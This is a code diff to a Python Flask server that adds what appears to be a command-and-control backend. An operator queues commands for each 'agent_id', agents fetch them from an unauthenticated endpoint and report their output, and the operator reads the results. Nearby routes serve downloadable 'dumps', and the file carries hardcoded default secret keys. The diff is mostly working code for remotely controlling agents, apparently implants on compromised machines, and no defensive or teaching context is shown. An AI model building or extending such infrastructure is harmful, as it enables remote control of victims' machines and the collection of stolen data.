@@ -9,6 +9,9 @@ from Crypto.Util.Padding import unpad
 import base64
 import hashlib
 
+command_queue = {}
+command_results = {}
+
 SECRET_KEY = os.getenv('SECRET_KEY', 'FromThe104WeSurveyTheOtherSideOfTheSea')
 AES_SECRET = os.getenv("AES_SECRET", "FromThe104")
 
@@ -74,10 +77,43 @@ def list_dumps():
 def get_dump(filename):
     return send_from_directory(DUMP_DIR, filename)
 
-@app.route('/command', methods=['POST', 'GET'])
+@app.route('/command/<agent_id>', methods=['POST'])
 @require_token
-def command_center():
-    #Will be created later
-    return jsonify({'status': "Waiting"})
+def set_command(agent_id):
+    data = request.get_json()
+    cmd = data.get("cmd")
+
+    if not cmd:
+        return jsonify({"error": "Missing 'cmd'"}), 400
+
+    command_queue[agent_id] = cmd
+    return jsonify({"status": "command set", "cmd": cmd})
+
+@app.route('/get/<agent_id>', methods=['GET'])
+def get_command(agent_id):
+    cmd = command_queue.pop(agent_id, None)
+    if cmd:
+        return jsonify({"cmd": cmd})
+    return jsonify({"cmd": None})
+
+@app.route('/report/<agent_id>', methods=['POST'])
+def report_output(agent_id):
+    data = request.get_json()
+    output = data.get("output")
+
+    if not output:
+        return jsonify({"error": "Missing 'output'"}), 400
+
+    command_results[agent_id] = output
+    return jsonify({"status": "output received"})
+
+@app.route('/results/<agent_id>', methods=['GET'])
+@require_token
+def get_results(agent_id):
+    output = command_results.get(agent_id)
+    if not output:
+        return jsonify({"output": None})
+    return jsonify({"output": output})
+
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
